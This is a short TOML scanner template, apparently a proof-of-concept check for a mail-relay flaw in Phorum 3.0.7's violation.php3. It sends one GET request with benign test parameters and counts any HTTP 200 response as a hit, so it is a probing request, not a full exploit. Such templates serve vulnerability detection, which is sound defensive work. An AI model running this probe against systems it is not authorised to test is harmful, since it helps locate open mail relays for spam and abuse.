[info]
author = "ave"
description = "通过向 Phorum 3.0.7 的 violation.php3 发送带有 Mod 和 ForumName 参数的 HTTP GET 请求，验证是否存在任意邮件中继漏洞。若脚本未做参数过滤，则攻击者可利用该接口向任意地址发送邮件。"
id = "POC-AVE-2000-0850"
name = "CVE-2000-1234 Phorum 3.0.7 violation.php3 邮件中继漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0850"]
vuln_id = [
    "CVE-2000-1234",
    "AVE-2000-0850",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/violation.php3"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[poc.requests.query]
ForumName = "AVE-PoC-Test"
Mod = "test@example.com"
